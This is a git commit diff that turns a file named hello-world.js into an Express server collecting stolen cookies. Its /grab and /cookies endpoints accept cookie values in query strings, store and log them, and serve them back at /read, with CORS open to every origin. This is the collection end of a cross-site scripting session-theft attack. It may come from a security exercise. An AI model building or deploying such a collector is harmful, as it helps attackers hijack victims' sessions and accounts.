313f2b619942ffb2ba6c792cd2322bc8ce4eb2d6
LucST626 <146832827+LucST626@users.noreply.github.com>
2024-11-04 08:43:43 +0100

    Update hello-world.js

--- hello-world.js
+++ hello-world.js
@@ -1,23 +1,40 @@
-const express = require('express')
-const app = express()
+const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors'); // Importar cors
+const escape = require('escape-html');
 
-let texto = ""
+const app = express();
+let cookiesAlmacenadas = ""; // Variable para almacenar las cookies
+
+app.use(cors()); // Habilitar CORS para todas las rutas
+app.use(bodyParser.json());
+
 app.get('/', (req, res) => {
-    console.log("el usuario llamo a /")
-  res.send('Hello World!')
-})
-
-app.get('/grab', (req, res) => {
-    const data = req.query.data
-    
-  texto+=data
-    res.send(`Received data: ${data}`);
-})
-
-app.get('/read', (req, res) => {
-    res.send(texto);
+    res.send('Página principal: siuuu');
 });
 
+app.get('/grab', (req, res) => {
+    const data = req.query.data;  // Obtener las cookies
+    cookiesAlmacenadas += " " + escape(data); // Almacenar las cookies
+    res.send(escape(data));
+});
+
+app.get('/read', (req, res) => {
+    res.send(escape(cookiesAlmacenadas)); // Enviar las cookies almacenadas
+});
+
+app.get('/cookies', (req, res) => {
+    const cookies = req.query.cookies; // Obtener las cookies 
+    cookiesAlmacenadas = cookies; // Almacenar las cookies
+    console.log('Cookies recibidas:', cookies); 
+    res.send('Cookies recibidas correctamente'); 
+});
+
+//app.get('/show-cookies', (req, res) => {
+//    res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
+//});
+
+// Iniciar el servidor
 app.listen(3000, () => {
-  console.log(`Example app listening on port ${3000}`)
-})
+    console.log('Servidor funcionando en el puerto 3000');
+});
